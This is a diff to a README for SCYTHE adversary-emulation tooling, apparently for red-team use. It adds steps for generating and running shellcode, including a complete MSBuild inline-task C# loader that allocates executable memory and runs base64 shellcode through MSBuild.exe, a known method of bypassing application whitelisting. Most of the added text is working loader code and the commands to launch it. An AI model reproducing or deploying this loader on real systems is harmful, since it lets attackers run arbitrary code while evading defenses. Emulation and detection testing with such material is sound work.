@@ -16,7 +16,34 @@ In the Campaign List, select the Campaign that you created to view its detailed 
 
 In the Campaign List, select the Campaign that you created to view its detailed page. Click the "Download" button. You will be shown a "Download Campaign Client" menu. Select your preferred architecture (64-bit or 32-bit) and "Shellcode + DLL" for the File Type. Click the Download SCYTHE Client button. The shellcode should begin downloading.
 
-## Creating the Shellcode Runner
+
+## Using the msbuild_gen.py Script
+
+**The Python3 msbuild_gen.py script contained in this repository automates the processes below. The script is provided as-is and is not officially supported by SCYTHE. It is a proof of concept on how to use the SCYTHE shellcode in an automated and consistent build process.**
+
+### For leveraging 32 bit shellcode downloaded:
+
+Running the following command with the shellcode file being named `shellcode32.bin` will result in a bad32.xml file created in the directory.
+```python
+python3 msbuild_gen.py shellcode32.bin 32
+```
+To then execute this, run the following in PowerShell
+```
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe .\bad-32.xml
+```
+
+### For leveraging 64 bit shellcode downloaded:
+
+Running the following command with the shellcode file being named `shellcode64.bin` will result in a bad64.xml file created in the directory.
+```python
+python3 msbuild_gen.py shellcode64.bin 64
+```
+To then execute this, run the following in PowerShell
+```
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe .\bad-64.xml
+```
+
+## Creating the Shellcode Runner for 32-bit
 
 Transform the shellcode file into a Base64 format. You may do this however you like, but any easy method is the following:
 
@@ -104,3 +131,92 @@ AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Task
     * `C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe .\msbuild.xml`
     * The SCYTHE client should connect with your SCYTHE server.
     * If the Powershell window is closed, connection will drop.
+
+## Creating the Shellcode Runner for 64-bit shellcode
+
+Transform the shellcode file into a Base64 format. You may do this however you like, but any easy method is the following:
+
+1) Open a PowerShell prompt and use the following code to transform the .bin file into a Base64-string. 
+
+    * Edit the path to the appropriate path for your .bin file.
+    * Ensure you have double "\\\\" between directories in the string.
+```powershell
+$filename = "C:\\Users\\User\\Downloads\\test1_scythe_client64.bin"
+[Convert]::ToBase64String([IO.File]::ReadAllBytes($filename)) | clip
+```
+ 
+2) You will now have a large Base64 string in your clipboard that you may paste elsewhere. Create a new XML file with and paste the following into it, replacing the existing Base64 string:
+
+```xml
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+<!-- This inline task executes shellcode. This example XML file is modified from an example payload created by Casey Smith. It has been modified to support non-blocking shellcode loaders.-->
+<!-- C:\Windows\Microsoft.NET\Framework\\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
+<!-- Save This File And Execute The Above Command -->
+<!-- Authors: Casey Smith, Twitter: @subTee , The Wover-->
+<!-- License: BSD 3-Clause -->
+<Target Name="Run">
+<ClassExample />
+</Target>
+<UsingTask
+TaskName="ClassExample"
+TaskFactory="CodeTaskFactory"
+AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+    <Task>
+        <Code Type="Class" Language="cs">
+            <![CDATA[
+            using System;
+            using System.Runtime.InteropServices;
+            using Microsoft.Build.Framework;
+            using Microsoft.Build.Utilities;
+            public class ClassExample :  Task, ITask
+            {         
+                private static UInt64 MEM_COMMIT = 0x1000;
+                private static UInt64 PAGE_EXECUTE_READWRITE = 0x40;
+
+                [DllImport("kernel32")]
+                private static extern UInt64 VirtualAlloc(UInt64 lpStartAddr, UInt64 size, UInt64 flAllocationType, UInt64 flProtect);
+
+                [DllImport("kernel32")]
+                private static extern IntPtr CreateThread(UInt64 lpThreadAttributes, UInt64 dwStackSize, UInt64 lpStartAddress, IntPtr param, UInt64 dwCreationFlags, ref UInt64 lpThreadId);
+
+                [DllImport("kernel32")]
+                private static extern UInt64 WaitForSingleObject(IntPtr hHandle, UInt64 dwMilliseconds);
+
+                public override bool Execute()
+                {
+                //replace with your own shellcode
+                    string b64 = "YOmlAgAAW4PsKInliV0Ag8MAZKEwAAA.....AAAAAAAAAA=";
+                   byte[] shellcode = System.Convert.FromBase64String(b64);
+                    
+                    UInt64 funcAddr = VirtualAlloc(0, (UInt64)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+                    Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
+                    IntPtr hThread = IntPtr.Zero;
+                    UInt64 threadId = 0;
+                    IntPtr pinfo = IntPtr.Zero;
+                    hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
+
+                    // Loop endlessly to prevent the process from exiting
+                    int x = 0;
+                    for (int i = 0; i==i; i++) 
+                    {
+                        x = i;
+                        x++;
+                    }
+                    return true;
+                } 
+            }     
+            ]]>
+            </Code>
+        </Task>
+    </UsingTask>
+</Project>
+```
+
+3) When you replace the existing base64 string with your own, keep in mind the following. 
+    * Delete the pre-existing text between the double quotes and the paste from your clipboard.
+    * Make sure that there are no spaces or newlines inside of the string or between the double quotes.
+4) Save the file as an XML file (such as `msbuild.xml`).
+5) In your Powershell prompt, run the following command, replacing the path to the .XML file with your own:
+    * `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe .\msbuild.xml`
+    * The SCYTHE client should connect with your SCYTHE server.
+    * If the Powershell window is closed, connection will drop
